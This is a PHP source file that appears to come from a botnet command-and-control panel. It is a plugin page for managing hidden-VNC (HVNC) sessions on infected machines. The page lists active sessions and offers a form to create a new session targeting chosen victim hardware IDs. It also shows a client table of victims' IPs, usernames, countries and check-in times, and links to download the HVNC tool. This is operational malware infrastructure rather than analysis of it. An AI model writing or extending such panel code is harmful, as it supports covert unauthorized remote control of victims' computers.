<?php 
if(!isset($initialized))
{
	include('../../pages/404.php');
}

include_once("config.php");

if(isset($_GET['action']) && $_GET['action'] == 'new_session')
{
	
}
elseif(isset($_GET['show']))
{
	$query = "SELECT * FROM hvnc WHERE session_id = :session_id";
	$query_params = array(':session_id' => $_GET['show']);
	try 
	{ 
		// *These two statements run the query against your database table. 
		$stmt = $db->prepare($query); 
		$stmt->execute($query_params); 
	} 
	catch(PDOException $ex) 
	{ 
		// Note: On a production website, you should not output $ex->getMessage(). 
		// It may provide an attacker with helpful information about your code.  
		DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
	} 
	 
	// Finally, we can retrieve all of the found rows into an array using fetchAll 
	$rows = $stmt->fetchAll();
}
else
{
	$query = "SELECT DISTINCT session_id FROM hvnc";
	try 
	{ 
		// *These two statements run the query against your database table. 
		$stmt = $db->prepare($query); 
		$stmt->execute(); 
	} 
	catch(PDOException $ex) 
	{ 
		// Note: On a production website, you should not output $ex->getMessage(). 
		// It may provide an attacker with helpful information about your code.  
		DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
	} 
	 
	// Finally, we can retrieve all of the found rows into an array using fetchAll 
	$rows = $stmt->fetchAll();
}

?>
<?php if(isset($_GET['action']) && $_GET['action'] == 'new_session'): ?>
<div class="row">
<form action="?page=<?php echo $plugin_guid ?>" method="post">
	<div class="col-lg-4">
		<!--box -->
		<div class="panel panel-default">
			<div class="panel-heading">
				<h3 class="panel-title"><i class="fa fa-globe"></i> Session Options</h3>
			</div>
			<div class="panel-body">
				<p>
					<label>Domain</label> [<a href="javascript:void(0)" data-toggle="tooltip" data-placement="right" title="Hostname or the IP of the machine running HVNC tool!" >?</a>]
					<input style="color:black;" name="domain" placeholder="127.0.0.1" class="form-control"></input>
				</p>
				<p>
					<label>Port</label> [<a href="javascript:void(0)" data-toggle="tooltip" data-placement="right" title="Port where HVNC tool listens to!" >?</a>]
					<input style="color:black;" name="port" placeholder="5000" class="form-control"></input>
				</p>
				<p>
					<label>HVNC Session Expiration Date</label> [<a href="javascript:void(0)" data-toggle="tooltip" data-placement="right" title="If you leave it empty session will never expire!" >?</a>]
					<div style="position: relative; top: -10px" class='input-group date' id='datetimepicker1'>
						<input style="color:black;" type='text' placeholder="No Expiration" name="expiration_date" class="form-control" />
						<span class="input-group-addon">
							<span class="fa fa-calendar"></span>
						</span>
					</div>
				</p>
				<div style="text-align: center">
					<button class="btn btn-sm btn-primary btn-flat" type="submit" name="create_session" id="btn_finish" href="#">Create Session</button>
				</div>
			</div><!-- /.box-body-->
		</div><!-- /.box -->
	</div>
	<div class="col-lg-8">
		<!--box -->
		<div class="panel panel-default">
			<div class="panel-heading">
				<h3 class="panel-title"><i class="fa fa-filter"></i> HWID Filter</h3>
			</div>
			<div class="panel-body">
				 <textarea rows="4"	style="width: 100%;color:black;" name="hwids" placeholder="hwid;hwid;hwid;"></textarea>
				 <small>Note: Use ; to separate HWIDs</small>
			</div><!-- /.box-body-->
		</div><!-- /.box -->
	</div>
</form>
</div>


<?php elseif(isset($_GET['show'])): ?>
<div class="row">
    <div class="col-lg-12">
		<!--box -->
		<div class="panel panel-default">
			<div class="panel-heading">
				<h3 class="panel-title"><i class="fa fa-list"></i> Client List</h3>
			</div>
			<div class="panel-body">
			<table id="clients_table" class="table table-hover" style="background-color:rgba(0, 0, 0, 0);">
					<thead>
						<tr>
							<th>IP</th>
							<th>HWID</th>
							<th>Username</th>
							<th>Country</th>
							<th>Last Checked</th>
							<th>Options</th>
						</tr>
					</thead>
					<tbody>
					<?php foreach($rows as $row):
								
								$query = "SELECT * FROM clients WHERE hwid = :hwid LIMIT 1";
								$query_param = array(':hwid' => $row['hwid']);
								try 
								{ 
									$stmt = $db->prepare($query); 
									$stmt->execute($query_param); 
								} 
								catch(PDOException $ex) 
								{ 
									DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
								} 
								$client_row = $stmt->fetch();
								
							?>
							<tr>
								<td><?php echo $client_row['ip']; ?></td>
								<td><a href="javascript:void(0)" data-toggle="modal" data-target="#client_info" onclick="LoadClientInfo('<?php echo $client_row['hwid']; ?>')"><?php echo $client_row['hwid']; ?></a></td>
								<td><?php echo FilterOutput($client_row['user']); ?></td>
								<td><?php 
									$flag_to_check = "assets/flags/" . strtolower($client_row['cc']) . ".gif";
									if(file_exists($flag_to_check))
									{
										echo '<img src="' . $flag_to_check . '"> ' . code_to_country($client_row['cc']);
									}
									else
									{
										echo '<img src="assets/flags/noflag.png"> Unknown';
									}
								?></td>
								<td><?php echo date("j M Y, G:i", $client_row['last_check']); ?></td>
								<td>N/A</td>
							</tr>
							<?php endforeach ?>
					</tbody>
				</table>
			</div><!-- /.box-body-->
		</div><!-- /.box -->
	</div>
</div>
<?php else: ?>
<div class="row">
    <div class="col-lg-12">
		<!--box -->
		<div class="panel panel-default">
			<div class="panel-heading">
				<h3 class="panel-title"><i class="fa fa-list"></i> Active Sessions</h3>
				<div style="float:right; font-size: 85%; position: relative; top:-10px">
					<a href="?page=33f7b140-94ac-4aad-8a31-6076200097d6&action=new_session">Create New HVNC Session</a>&nbsp;
					<a href="?page=33f7b140-94ac-4aad-8a31-6076200097d6&action=download">Download HVNC Tool</a>
				</div>
			</div>
			<div class="panel-body">
			<table id="proxy_table" class="table table-hover" style="background-color:rgba(0, 0, 0, 0);">
					<thead>
						<tr>
							<th>Session Id</th>
							<th>Domain</th>
							<th>Port</th>
							<th>Activity</th>
							<th>Expiration Date</th>
							<th>Options</th>
						</tr>
					</thead>
					<tbody>
					<?php foreach($rows as $row):
								
								$query = "SELECT * FROM hvnc WHERE session_id = :session_id";
								$query_param = array(':session_id' => $row['session_id']);
								try 
								{ 
									$stmt = $db->prepare($query); 
									$stmt->execute($query_param); 
								} 
								catch(PDOException $ex) 
								{ 
									DEBUG_PRINT("Failed to run query: " . $ex->getMessage()); 
								} 
								$proxy_rows = $stmt->fetchAll();
								
							?>
							<tr>
								<td><a href="?page=33f7b140-94ac-4aad-8a31-6076200097d6&show=<?php echo FilterOutput($proxy_rows[0]['session_id']); ?>"><?php echo $proxy_rows[0]['session_id']; ?></a></td>
								<td><?php echo FilterOutput($proxy_rows[0]['domain']); ?></td>
								<td><?php echo FilterOutput($proxy_rows[0]['port']); ?></td>
								<td>N/A</td>
								<td><?php echo ($proxy_rows[0]['expiration'] == 0 ? "Never" : date("j M Y, G:i", $proxy_rows[0]['expiration'])); ?></td>
								<td><a href="?page=<?php echo $plugin_guid; ?>&delete=<?php echo FilterOutput($proxy_rows[0]['session_id']); ?>" data-toggle="tooltip" data-placement="left" title="Delete Session"><i class="fa fa-close"></i></a>
								</td>
							</tr>
							<?php endforeach ?>
					</tbody>
				</table>
			</div><!-- /.box-body-->
		</div><!-- /.box -->
	</div>
</div>
<?php endif; ?>